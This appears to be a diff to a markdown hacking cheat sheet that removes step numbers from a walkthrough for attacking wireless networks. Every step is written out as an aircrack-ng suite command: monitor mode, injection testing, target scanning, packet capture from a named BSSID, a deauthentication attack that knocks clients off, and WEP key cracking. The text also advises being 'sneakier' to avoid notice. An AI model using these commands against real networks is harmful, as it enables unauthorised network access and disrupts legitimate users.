@@ -37,19 +37,19 @@ John the Ripper: http://www.openwall.com/john/
 Snooping on wireless networks
 -----------------------------
 
-1. Enable a monitoring interface on your wireless NIC
+Enable a monitoring interface on your wireless NIC
  
 ```
 airmon-ng start wlan1
 ```
 
-2. Check that your card support packet injection
+Check that your card support packet injection
 
 ```
  aireplay-ng --test mon0 
 ```
 
-3. Check what wireless networks are out there (find our targets)
+Check what wireless networks are out there (find our targets)
 
 ```
  airodump-ng mon0
@@ -61,13 +61,13 @@ WEP Networks
 
 Following from the steps above...
 
-4. Home in on our target network and start saving packets for cracking later
+Home in on our target network and start saving packets for cracking later
 
 ```
  airodump-ng --bssid 00:1F:1F:A8:9D:34 --channel 1 mon0 -w packetcapture.pcap
 ```
 
-5. Run a "deauth" attack to knock client off the target network
+Run a "deauth" attack to knock client off the target network
  
 ```
  aireplay-ng --deauth 10 -a 00:1F:1F:A8:9D:34 --channel 1 mon0 
@@ -78,7 +78,7 @@ You can either continue to do this and probably get noticed, or shift your attac
 to something a little sneakier. Either way you will want to get as much data as you 
 can in order to crack the password.
 
-6. Crack that password
+Crack that password
  
 ```
  aircrack-ng -a 1 packetcapture.pcap
